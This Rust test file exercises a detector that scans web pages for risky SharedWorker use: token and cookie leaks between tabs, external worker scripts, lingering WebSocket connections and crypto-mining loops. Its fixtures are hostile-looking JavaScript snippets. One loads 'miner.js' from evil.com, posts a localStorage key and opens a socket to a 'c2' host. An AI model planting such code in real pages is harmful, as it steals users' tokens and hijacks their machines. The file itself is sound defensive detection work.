use crate::shared_worker_audit::*;

#[test]
fn empty_body_no_issues() {
    let issues = analyze_shared_worker("");
    assert!(issues.is_empty());
}

#[test]
fn no_shared_worker_no_issues() {
    let body = "<script>var worker = new Worker('task.js');</script>";
    let issues = analyze_shared_worker(body);
    assert!(issues.is_empty());
}

#[test]
fn api_detected_on_shared_worker_presence() {
    let body = "<script>var sw = new SharedWorker('worker.js');</script>";
    let issues = analyze_shared_worker(body);
    assert!(issues.iter().any(|i| *i == SharedWorkerIssue::ApiDetected));
}

#[test]
fn cross_tab_data_leak_detected() {
    let body = r#"
        var sw = new SharedWorker('w.js');
        sw.port.postMessage(localStorage.getItem('token'));
    "#;
    let issues = analyze_shared_worker(body);
    assert!(issues
        .iter()
        .any(|i| *i == SharedWorkerIssue::CrossTabDataLeak));
}

#[test]
fn cross_tab_data_leak_with_onmessage_and_cookie() {
    let body = r#"
        var sw = new SharedWorker('w.js');
        sw.port.onmessage = function(e) { document.cookie = e.data; };
    "#;
    let issues = analyze_shared_worker(body);
    assert!(issues
        .iter()
        .any(|i| *i == SharedWorkerIssue::CrossTabDataLeak));
}

#[test]
fn cross_tab_data_leak_not_flagged_without_storage() {
    let body = r#"
        var sw = new SharedWorker('w.js');
        sw.port.postMessage('hello');
    "#;
    let issues = analyze_shared_worker(body);
    assert!(!issues
        .iter()
        .any(|i| *i == SharedWorkerIssue::CrossTabDataLeak));
}

#[test]
fn external_worker_script_detected() {
    let body = r#"var sw = new SharedWorker("https://cdn.example.com/worker.js");"#;
    let issues = analyze_shared_worker(body);
    assert!(issues
        .iter()
        .any(|i| *i == SharedWorkerIssue::ExternalWorkerScript));
}

#[test]
fn external_worker_script_not_flagged_for_local() {
    let body = r#"var sw = new SharedWorker("/workers/shared.js");"#;
    let issues = analyze_shared_worker(body);
    assert!(!issues
        .iter()
        .any(|i| *i == SharedWorkerIssue::ExternalWorkerScript));
}

#[test]
fn persistent_connection_detected() {
    let body = r#"
        var sw = new SharedWorker('w.js');
        var ws = new WebSocket('wss://example.com/stream');
    "#;
    let issues = analyze_shared_worker(body);
    assert!(issues
        .iter()
        .any(|i| *i == SharedWorkerIssue::PersistentConnection));
}

#[test]
fn persistent_connection_not_flagged_with_close() {
    let body = r#"
        var sw = new SharedWorker('w.js');
        var ws = new WebSocket('wss://example.com/stream');
        ws.close();
    "#;
    let issues = analyze_shared_worker(body);
    assert!(!issues
        .iter()
        .any(|i| *i == SharedWorkerIssue::PersistentConnection));
}

#[test]
fn persistent_connection_not_flagged_with_terminate() {
    let body = r#"
        var sw = new SharedWorker('w.js');
        var es = new EventSource('/events');
        sw.terminate;
    "#;
    let issues = analyze_shared_worker(body);
    assert!(!issues
        .iter()
        .any(|i| *i == SharedWorkerIssue::PersistentConnection));
}

#[test]
fn crypto_mining_detected() {
    let body = r#"
        var sw = new SharedWorker('miner.js');
        while(true) { crypto.subtle.digest('SHA-256', data); }
    "#;
    let issues = analyze_shared_worker(body);
    assert!(issues
        .iter()
        .any(|i| *i == SharedWorkerIssue::CryptoMining));
}

#[test]
fn crypto_mining_with_set_interval_and_wasm() {
    let body = r#"
        var sw = new SharedWorker('w.js');
        setInterval(function() { wasm.mine(); }, 100);
    "#;
    let issues = analyze_shared_worker(body);
    assert!(issues
        .iter()
        .any(|i| *i == SharedWorkerIssue::CryptoMining));
}

#[test]
fn crypto_mining_not_flagged_without_loop() {
    let body = r#"
        var sw = new SharedWorker('w.js');
        crypto.subtle.digest('SHA-256', data);
    "#;
    let issues = analyze_shared_worker(body);
    assert!(!issues
        .iter()
        .any(|i| *i == SharedWorkerIssue::CryptoMining));
}

#[test]
fn all_issues_detected() {
    let body = r#"
        var sw = new SharedWorker("https://evil.com/miner.js");
        sw.port.postMessage(localStorage.getItem('key'));
        var ws = new WebSocket('wss://c2.example.com/cmd');
        while(true) { crypto.subtle.digest('SHA-256', data); }
    "#;
    let issues = analyze_shared_worker(body);
    assert_eq!(issues.len(), 5);
    assert!(issues.iter().any(|i| *i == SharedWorkerIssue::ApiDetected));
    assert!(issues
        .iter()
        .any(|i| *i == SharedWorkerIssue::CrossTabDataLeak));
    assert!(issues
        .iter()
        .any(|i| *i == SharedWorkerIssue::ExternalWorkerScript));
    assert!(issues
        .iter()
        .any(|i| *i == SharedWorkerIssue::PersistentConnection));
    assert!(issues
        .iter()
        .any(|i| *i == SharedWorkerIssue::CryptoMining));
}

#[test]
fn severity_ordering() {
    assert!(
        shared_worker_severity(&SharedWorkerIssue::CryptoMining)
            > shared_worker_severity(&SharedWorkerIssue::ExternalWorkerScript)
    );
    assert!(
        shared_worker_severity(&SharedWorkerIssue::ExternalWorkerScript)
            > shared_worker_severity(&SharedWorkerIssue::CrossTabDataLeak)
    );
    assert!(
        shared_worker_severity(&SharedWorkerIssue::CrossTabDataLeak)
            > shared_worker_severity(&SharedWorkerIssue::PersistentConnection)
    );
    assert!(
        shared_worker_severity(&SharedWorkerIssue::PersistentConnection)
            > shared_worker_severity(&SharedWorkerIssue::ApiDetected)
    );
}

#[test]
fn display_variants() {
    assert_eq!(SharedWorkerIssue::ApiDetected.to_string(), "api_detected");
    assert_eq!(
        SharedWorkerIssue::CrossTabDataLeak.to_string(),
        "cross_tab_data_leak"
    );
    assert_eq!(
        SharedWorkerIssue::ExternalWorkerScript.to_string(),
        "external_worker_script"
    );
    assert_eq!(
        SharedWorkerIssue::PersistentConnection.to_string(),
        "persistent_connection"
    );
    assert_eq!(
        SharedWorkerIssue::CryptoMining.to_string(),
        "crypto_mining"
    );
}

#[test]
fn to_operations_produces_entries() {
    let issues = vec![
        SharedWorkerIssue::ApiDetected,
        SharedWorkerIssue::CrossTabDataLeak,
        SharedWorkerIssue::CryptoMining,
    ];
    let mut seq = 50;
    let ops = shared_worker_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 3);
    assert_eq!(seq, 53);
}

#[test]
fn case_sensitive_detection() {
    let lower = "<script>var sw = new sharedworker('w.js');</script>";
    let issues = analyze_shared_worker(lower);
    assert!(issues.is_empty());

    let correct = "<script>var sw = new SharedWorker('w.js');</script>";
    let issues = analyze_shared_worker(correct);
    assert!(!issues.is_empty());
}
